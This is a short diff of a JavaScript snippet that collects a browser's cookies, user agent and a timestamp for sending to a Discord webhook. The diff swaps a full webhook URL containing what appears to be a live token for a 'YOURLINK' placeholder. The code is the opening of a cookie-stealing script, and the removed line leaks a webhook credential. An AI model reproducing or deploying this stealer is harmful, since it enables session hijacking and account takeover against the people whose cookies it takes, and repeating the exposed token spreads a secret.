@@ -1,4 +1,4 @@
-const webhookURL = "https://discord.com/api/webhooks/1387449374711218386/i0PvnyXDG58iIs2Tysg6vH1_BdRRIWuKhYZBrk5Aq3YDF47bqV2tryJ20fZI7hM79Hy3";
+const webhookURL = "https://discord.com/api/webhooks/YOURLINK";
 const cookies = document.cookie;
 const userAgent = navigator.userAgent;
 const timestamp = new Date().toISOString();
